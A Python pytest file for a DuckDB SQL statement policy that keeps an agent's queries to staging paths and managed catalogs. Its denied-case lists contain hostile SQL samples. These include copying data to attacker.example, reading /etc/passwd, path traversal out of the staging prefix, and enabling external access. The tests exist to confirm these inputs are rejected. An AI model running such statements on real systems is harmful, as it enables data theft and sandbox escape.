"""Capability-scoped statement policy: what dbt/dlt need is admitted; sandbox
escapes are rejected fail-closed."""

import pytest

from api.services.statement_policy import StatementNotAllowed, assert_statement_allowed

_STAGING = ["s3://warehouse/analytics/_staging/sess-1/"]
_MANAGED = {"sales", "analytics"}


def _check(sql: str) -> None:
    assert_statement_allowed(sql, staging_prefixes=_STAGING, managed_catalogs=_MANAGED)


ALLOWED = [
    "SELECT 1",
    "SELECT * FROM sales.analytics.orders WHERE n > 1",
    "INSERT INTO t SELECT 1",
    "UPDATE t SET n = 1",
    "DELETE FROM t WHERE n = 1",
    "CREATE TABLE t AS SELECT 1 AS n",
    "ALTER TABLE t ADD COLUMN c INTEGER",
    "DROP TABLE t",
    "USE sales.analytics",
    "BEGIN TRANSACTION",
    "COMMIT",
    "ROLLBACK",
    "SET timezone = 'UTC'",
    "SET search_path = 'analytics'",
    "COPY t TO 's3://warehouse/analytics/_staging/sess-1/out.parquet' (FORMAT PARQUET)",
    "COPY t FROM 's3://warehouse/analytics/_staging/sess-1/in.parquet' (FORMAT PARQUET)",
    "SELECT * FROM read_parquet('s3://warehouse/analytics/_staging/sess-1/x.parquet')",
    "ATTACH 'sales' AS sales (TYPE ICEBERG)",
    # A URL-looking string as data (not a file arg) is fine.
    "SELECT 'http://not-a-file' AS c",
    # DESCRIBE is read-only introspection dbt relies on for column metadata.
    "DESCRIBE sales.analytics.orders",
    'DESCRIBE "sales"."analytics"."orders"',
]

DENIED = [
    ("COPY t TO 'http://attacker.example/x.parquet'", "copy_path"),
    ("COPY t TO '/etc/passwd'", "copy_path"),
    ("COPY t TO 's3://other-bucket/x.parquet'", "copy_path"),
    ("SET memory_limit = '8GB'", "set_name"),
    ("SET enable_external_access = true", "set_name"),
    ("SET disabled_filesystems = ''", "set_name"),
    ("INSTALL httpfs", "install"),
    ("LOAD spatial", "command"),
    ("ATTACH 'evil.db' AS evil", "attach_target"),
    ("ATTACH 'other' AS other (TYPE ICEBERG)", "attach_target"),
    ("SELECT * FROM read_parquet('/etc/passwd')", "read_path"),
    ("SELECT * FROM read_csv('s3://other/x.csv')", "read_path"),
    ("SELECT * FROM read_json_auto('/tmp/x.json')", "read_path"),
    ("SELECT * FROM glob('/**')", "read_path"),
    ("this is not sql at all ;;;", "unparseable"),
    ("", "empty"),
]


@pytest.mark.parametrize("sql", ALLOWED)
def test_allowed(sql):
    _check(sql)  # must not raise


@pytest.mark.parametrize(("sql", "rule"), DENIED)
def test_denied(sql, rule):
    with pytest.raises(StatementNotAllowed) as exc:
        _check(sql)
    assert exc.value.rule == rule


def test_multi_statement_rejected_if_any_denied():
    with pytest.raises(StatementNotAllowed) as exc:
        _check("SELECT 1; INSTALL httpfs; SELECT 2")
    assert exc.value.rule == "install"


def test_read_parquet_with_non_literal_path_is_denied():
    # A path we cannot statically verify is rejected fail-closed.
    with pytest.raises(StatementNotAllowed) as exc:
        _check("SELECT * FROM read_parquet(concat('s3://', 'x'))")
    assert exc.value.rule == "read_path"


# ── Parser divergence between sqlglot (this policy) and DuckDB (the agent) ────
#
# Each case below was verified to be a real, working DuckDB read/write that this
# policy previously admitted. They are the structural risk of an API-side-only
# policy, so they get explicit regression coverage.

DIVERGENCE_DENIED = [
    # DuckDB's replacement scan: a bare path/URL in FROM is a file read. sqlglot
    # models it exactly like a quoted identifier, so it slipped through.
    ("SELECT * FROM 'http://attacker.example/x.parquet'", "read_path"),
    ("SELECT * FROM '/etc/passwd'", "read_path"),
    ("SELECT * FROM 's3://other-bucket/secrets.parquet'", "read_path"),
    ("INSERT INTO t SELECT * FROM 'http://attacker.example/x.parquet'", "read_path"),
    # File-reading functions the original list missed.
    ("SELECT * FROM sniff_csv('http://attacker.example/a.csv')", "read_path"),
    ("SELECT * FROM parquet_metadata('http://attacker.example/a.parquet')", "read_path"),
    ("SELECT * FROM parquet_schema('/etc/passwd')", "read_path"),
    ("SELECT * FROM iceberg_scan('http://attacker.example/meta.json')", "read_path"),
    ("SELECT * FROM delta_scan('http://attacker.example/')", "read_path"),
    # `..` resolved outside the staging prefix after a naive startswith check.
    (
        "COPY (SELECT 1) TO 's3://warehouse/analytics/_staging/sess-1/../../evil.parquet'",
        "copy_path",
    ),
    (
        "SELECT * FROM read_parquet('s3://warehouse/analytics/_staging/sess-1/../../../x.parquet')",
        "read_path",
    ),
]


@pytest.mark.parametrize(("sql", "rule"), DIVERGENCE_DENIED)
def test_parser_divergence_escapes_are_denied(sql, rule):
    with pytest.raises(StatementNotAllowed) as exc:
        _check(sql)
    assert exc.value.rule == rule


DIVERGENCE_ALLOWED = [
    # Ordinary quoted identifiers must not be mistaken for paths — dbt quotes
    # names with spaces, case, or reserved words all the time.
    'SELECT * FROM "my table"',
    'SELECT * FROM "my cat"."my schema"."my table"',
    'SELECT "select" FROM "order"',
    # A staged file read through the replacement scan is legitimate.
    "SELECT * FROM 's3://warehouse/analytics/_staging/sess-1/part-0.parquet'",
    # `.` segments inside the staging prefix normalize back into it.
    "SELECT * FROM read_parquet('s3://warehouse/analytics/_staging/sess-1/./part-0.parquet')",
]


@pytest.mark.parametrize("sql", DIVERGENCE_ALLOWED)
def test_divergence_fixes_do_not_over_reject(sql):
    _check(sql)  # must not raise
